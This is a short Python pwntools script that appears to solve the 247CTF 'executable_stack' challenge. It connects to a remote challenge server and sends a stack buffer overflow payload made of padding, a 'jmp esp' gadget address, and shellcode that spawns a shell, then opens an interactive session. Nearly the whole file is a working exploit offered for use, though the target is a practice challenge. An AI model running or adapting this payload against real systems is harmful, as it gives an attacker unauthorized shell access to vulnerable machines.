
# source myenv/bin/activate
# PS:- before running this make sure to be in this folders venv for using pwntools library
from pwn import *
import sys

# Update context
context.update(arch='i386', os='linux', terminal=['gnome-terminal', '-e'])

# Path to the executable
#io = process(./executable_stack)


io = remote("6ab0d2ae54eb3d63.247ctf.com",50021)


'''
# Start the process

# Attach GDB
gdb.attach(io, gdbscript='continue')

# Send a cyclic pattern
pattern = cyclic(512)
io.sendline(pattern)


pause()
sys.exit()

'''

binary = ELF("./executable_stack")
jmp_esp = next(binary.search(asm("jmp esp")))

print(hex(jmp_esp))

exploit = flat(["A" * 140 , pack(jmp_esp), asm(shellcraft.sh())])

io.sendline(exploit)
io.interactive()